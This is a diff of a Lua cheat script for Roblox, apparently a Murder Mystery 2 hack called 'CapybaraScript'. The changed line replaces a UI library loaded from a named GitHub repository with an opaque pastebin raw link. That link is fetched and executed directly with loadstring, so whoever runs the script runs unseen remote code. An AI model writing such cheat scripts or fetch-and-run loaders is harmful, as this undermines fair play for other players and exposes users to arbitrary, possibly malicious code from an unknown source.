@@ -39,7 +39,7 @@ _G.mm2hacksalreadyloadedbyCITY512 = true
 
 notify("Script Loaded", "The script has been executed successfully and is ready to go.")
 
-local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/RedzLibV5/main/Source.Lua"))()
+local redzlib = loadstring(game:HttpGet("https://pastebin.com/raw/0nmYbera"))()
 
 local Window = redzlib:MakeWindow({"CapybaraScript", "BY CapybaritaYT.  v7.7.8", "testando-redzLibv5.json"})
 Window:AddMinimizeButton({
